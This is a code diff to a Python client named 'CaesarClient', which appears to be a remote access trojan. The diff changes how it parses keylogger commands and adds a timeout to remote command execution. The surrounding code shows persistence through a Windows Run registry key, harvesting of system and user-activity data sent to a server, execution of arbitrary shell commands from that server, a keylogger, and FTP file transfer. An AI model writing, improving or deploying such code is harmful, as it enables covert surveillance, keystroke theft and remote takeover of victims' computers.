@@ -30,7 +30,6 @@ class CaesarClient:
                 0,
                 winreg.KEY_ALL_ACCESS,
             )
-
             winreg.SetValueEx(key, "Caesar", 0, winreg.REG_SZ, script_path)
             winreg.CloseKey(key)
         except Exception as e:
@@ -52,7 +51,7 @@ class CaesarClient:
                 # print(err)
                 time.sleep(120) # try to reconnect after 2 minutes
 
-        ######################################## Harvest Target Info ###################################################
+        ######################################## Extract Target Info ###################################################
         self.systemInfoHarvester.get_platform_info(self.sock)
         self.systemInfoHarvester.send_installed_apps(self.sock)
         self.systemInfoHarvester.get_user_startup_programs(self.sock)
@@ -70,7 +69,7 @@ class CaesarClient:
 
         self.systemInfoHarvester.get_user_activity(self.sock)
         self.systemInfoHarvester.extract_other_info(self.sock)
-        ######################################## Harvest Target Info ###################################################
+        ######################################## Extract Target Info ###################################################
 
 
         # check command sent from the server
@@ -81,7 +80,7 @@ class CaesarClient:
                 self.sock.send(f"{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode()) #send current working directory back to server
 
             elif cmd[:2] == 'cd':
-                #change directory
+                # change directory
                 try:
                     os.chdir(cmd[3:])
                     result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -116,11 +115,15 @@ class CaesarClient:
                 self.generalFeatures.reboot(self.sock)
             elif cmd == "shutdown":
                 self.generalFeatures.shutdown(self.sock)
-            elif cmd == "start keylogger":
+
+            elif cmd.startswith("start keylogger "):
                 cmd = cmd.split()
+                print(cmd[2], cmd[3], cmd[4], cmd[5], cmd[6], cmd[7])
                 self.generalFeatures.keylogger_handler(self.sock, cmd[2], cmd[3], cmd[4], cmd[5], cmd[6], cmd[7])
+                
             elif cmd == "stop keylogger":
                 self.generalFeatures.stop_keylogger(self.sock)
+
             elif cmd == "keylogger status":
                 self.generalFeatures.is_keylogger_active(self.sock)
 
@@ -147,24 +150,25 @@ class CaesarClient:
                 if len(cmd) == 8:
                     self.generalFeatures.download_file_via_ftp(self.sock, "".join(cmd[2]), cmd[3], cmd[4], cmd[5], cmd[6], cmd[7])
                 elif len(cmd) > 8 or len(cmd) < 8:
-                    self.sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_caesar_text('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    self.sock.send(f"[-]Invalid command!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
             elif cmd.startswith("ftp upload"):
                 cmd = cmd.split(" ", 8)
                 if len(cmd) == 8:
                     self.generalFeatures.upload_file_via_ftp(self.sock, "".join(cmd[2]), cmd[3], cmd[4], cmd[5], cmd[6], cmd[7])
                 elif len(cmd) > 8 or len(cmd) < 8:
-                    self.sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_caesar_text('Caesar ').encode() + str(os.getcwd() + ": ").encode())
-
+                    self.sock.send(f"[-]Invalid command!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
             else:
                 try:
                     #return terminal output back to server
-                    terminal_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
-                                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-
-                    terminal_output = terminal_output.stdout.read() + terminal_output.stderr.read()
+                    terminal_output = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, timeout=30)
+                    terminal_output = terminal_output.stdout + terminal_output.stderr
                     terminal_output = terminal_output.decode()
                     output = f"{str(terminal_output)} \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: "
+                    self.sock.send(output.encode())
+
+                except subprocess.TimeoutExpired:
+                    output = f"Command timed out\n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: "
                     self.sock.send(output.encode())
 
                 except Exception as e:
